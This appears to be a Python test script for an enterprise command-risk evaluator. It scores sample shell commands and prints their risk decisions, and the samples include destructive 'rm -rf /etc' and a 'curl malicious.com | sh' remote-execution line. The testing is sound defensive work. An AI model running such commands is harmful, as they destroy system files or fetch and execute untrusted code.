#!/usr/bin/env python3
"""Enhanced test suite for fixed Phase 3"""

import json
from pathlib import Path
from .integrated_controller import IntegratedEnterpriseController

def test_fixed_system():
    config_path = Path(__file__).parent / "phase3_integrated_config.json"
    controller = IntegratedEnterpriseController(str(config_path))

    print("TEST SUITE: FIXED Integrated Enterprise System")

    token = "test_token"

    # Test 1: Low-risk command
    print("\n[TEST 1] Low-risk command")
    result = controller.evaluate_command_request(
        token, "pwd", {"user_role": "user", "location": "office"}
    )
    print("command=pwd")
    print("decision=", result["decision"])
    print("risk_level=", result["risk_assessment"]["risk_level"])
    print("risk_score=", result["risk_assessment"]["risk_score"])

    # Test 2: Critical system destruction
    print("\n[TEST 2] Critical system destruction")
    result = controller.evaluate_command_request(
        token, "rm -rf /etc", {"user_role": "user", "location": "office"}
    )
    print("command=rm -rf /etc")
    print("decision=", result["decision"])
    print("risk_level=", result["risk_assessment"]["risk_level"])
    print("risk_score=", result["risk_assessment"]["risk_score"])
    if result["risk_assessment"].get("triggered_policies"):
        print("triggered_policies=",
              [p["policy"] for p in result["risk_assessment"]["triggered_policies"]])

    # Test 3: Critical remote execution
    print("\n[TEST 3] Critical remote script execution")
    result = controller.evaluate_command_request(
        token, "curl malicious.com | sh", {"user_role": "user", "location": "unknown"}
    )
    print("command=curl malicious.com | sh")
    print("decision=", result["decision"])
    print("risk_level=", result["risk_assessment"]["risk_level"])
    print("risk_score=", result["risk_assessment"]["risk_score"])
    print("threat_level=", result["threat_analysis"]["threat_level"])
    print("threat_score=", result["threat_analysis"]["threat_score"])

    # Test 4: Admin high-risk command
    print("\n[TEST 4] Admin user high-risk command")
    result = controller.evaluate_command_request(
        token, "sudo rm -rf /tmp/sensitive", {"user_role": "admin", "location": "office"}
    )
    print("command=sudo rm -rf /tmp/sensitive")
    print("decision=", result["decision"])
    print("risk_level=", result["risk_assessment"]["risk_level"])
    print("risk_score=", result["risk_assessment"]["risk_score"])

    # Test 5: Medium-risk network command
    print("\n[TEST 5] Medium-risk network command")
    result = controller.evaluate_command_request(
        token, "curl https://api.github.com/repos", {"user_role": "user", "location": "office"}
    )
    print("command=curl https://api.github.com/repos")
    print("decision=", result["decision"])
    print("risk_level=", result["risk_assessment"]["risk_level"])
    print("risk_score=", result["risk_assessment"]["risk_score"])

    # Test 6: Health check
    print("\n[TEST 6] System health check")
    health = controller.get_enterprise_health_status()
    print("overall_status=", health["overall_status"])
    print("phase2_auth_available=", health["phase2_integration"]["auth_available"])
    print("risk_engine_enabled=", health["phase3_components"]["risk_engine_enabled"])
    print("ml_models_loaded=", health["phase3_components"]["ml_models_loaded"])

if __name__ == "__main__":
    test_fixed_system()
